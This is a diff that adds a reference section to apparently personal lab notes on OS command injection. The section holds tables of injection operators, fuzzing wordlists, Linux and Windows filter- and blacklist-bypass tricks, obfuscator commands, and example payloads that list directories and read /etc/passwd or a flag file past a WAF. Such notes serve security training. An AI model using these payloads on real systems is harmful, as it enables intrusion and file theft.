@@ -73,6 +73,88 @@ The combos that don't return the WAF's block message (e.g. "Malicious request de
 ## My notes / lab output
 Filled in as I run these on lab targets.
 
+## Full reference (source notes)
+Complete operator / separator / bypass / obfuscation set — nothing trimmed.
+
+**Injection operators**
+| Operator | Char | URL-encoded | Executes |
+|---|---|---|---|
+| Semicolon | `;` | `%3b` | Both |
+| New line | `\n` | `%0a` | Both |
+| Background | `&` | `%26` | Both (2nd output usually first) |
+| Pipe | `\|` | `%7c` | Both (only 2nd output shown) |
+| AND | `&&` | `%26%26` | Both (only if 1st succeeds) |
+| OR | `\|\|` | `%7c%7c` | 2nd only if 1st fails |
+| Sub-shell | `` `` `` | `%60%60` | Both (Linux only) |
+| Sub-shell | `$()` | `%24%28%29` | Both (Linux only) |
+
+**Separator wordlist** (for fuzzing): `; %3b \n %0a & %26 | %7c && %26%26 || %7c%7c `` %60%60 $() %24%28%29`
+
+**Obfuscated-command wordlist** (WAF-bypass test): `uname` · `u'n'a'm'e` · `${uname}` · `$(uname)` · `{uname}` · `$(rev<<<'emanu')` · `bash<<<$(base64 -d<<<dW5hbWUgLWE=)` · `b'a's'h'<<<$('b'a's'e'6'4 -d<<<dW5hbWUgLWE=)` · `l's'${IFS}${PATH:0:1}${IFS}-a'l'`
+
+**Linux — filtered character bypass**
+| Code | Description |
+|---|---|
+| `printenv` | View all environment variables |
+| `%09` | Tab instead of space |
+| `${IFS}` | Expands to space/tab (not inside `$()`) |
+| `{ls,-la}` | Commas become spaces |
+| `${PATH:0:1}` | → `/` |
+| `${LS_COLORS:10:1}` | → `;` |
+| `$(tr '!-}' '"-~'<<<[)` | Shift char by one → `\` |
+| `$(tr '!-}' '"-~'<<<:)` | Shift char by one → `;` |
+
+**Linux — blacklisted command bypass**
+| Code | Description |
+|---|---|
+| `'` or `"` (even count) | Character insertion |
+| `$@` or `\` | Insertion (Linux only) |
+| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Case manipulation |
+| `$(a="WhOaMi";printf %s "${a,,}")` | Case manipulation (variant) |
+| `echo 'whoami' \| rev` → `$(rev<<<'imaohw')` | Reverse then execute |
+| `echo -n 'cat /etc/passwd \| grep 33' \| base64` → `bash<<<$(base64 -d<<<Y2F0...)` | Base64 encode then execute |
+
+**Linux — space-filter bypass** (prefix `127.0.0.1%0a`): `%0a whoami` · `%0a%09` (tab) · `%0a${IFS}` · `%0a{ls,-la}` · `%0als${IFS}${PATH:0:1}home`
+
+**Windows — filtered character bypass**
+| Code | Description |
+|---|---|
+| `Get-ChildItem Env:` | View env variables (PowerShell) |
+| `%09` | Tab instead of space |
+| `%PROGRAMFILES:~10,-5%` | → space (CMD) |
+| `$env:PROGRAMFILES[10]` | → space (PowerShell) |
+| `%HOMEPATH:~0,-17%` | → `\` (CMD) |
+| `$env:HOMEPATH[0]` | → `\` (PowerShell) |
+| `echo %HOMEPATH:~6,-11%` | Produce `/`-like slash (CMD) |
+
+**Windows — blacklisted command bypass**
+| Code | Description |
+|---|---|
+| `'` or `"` (even count) | Character insertion |
+| `^` | Insertion (CMD only) |
+| `WhoAmi` | Odd-case beats naive blacklists |
+| `"whoami"[-1..-20] -join ''` | Reverse a string (PS) |
+| `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed (PS) |
+| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Base64 encode (PS, UTF-16LE) |
+| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 (PS) |
+
+**Automated obfuscation**
+| Command | Description |
+|---|---|
+| `./bashfuscator -c 'cat /etc/passwd'` | Auto-obfuscate (Linux) |
+| `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1` | Simpler, reliable output |
+| Invoke-DOSfuscation (`Import-Module`, `SET COMMAND <cmd>`, `encoding`) | Windows CMD obfuscation |
+
+**Example WAF-bypass payloads** (from the skills assessment)
+| Payload | Description |
+|---|---|
+| `ip=127.0.0.1%0al's'${IFS}-al${IFS}${PATH:0:1}home` | List /home through filters |
+| `ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt` | Read a file through filters |
+| `ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<<b64>)` | Reversed bash + base64 chain |
+| `?to=tmp%26$()l's'${IFS}${PATH:0:1}${IFS}-a'l'` | Sub-shell separator + obfuscated `ls` |
+
+> Note the Burp Intruder method (above) for finding which separator+command combo gets past the WAF: Payload 1 = separators (not URL-encoded), Payload 2 = obfuscated commands (URL-encoded), cluster bomb.
+
 ## 2. Setup
 - Attack box: (Pwnbox / Kali VM)
 - Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)
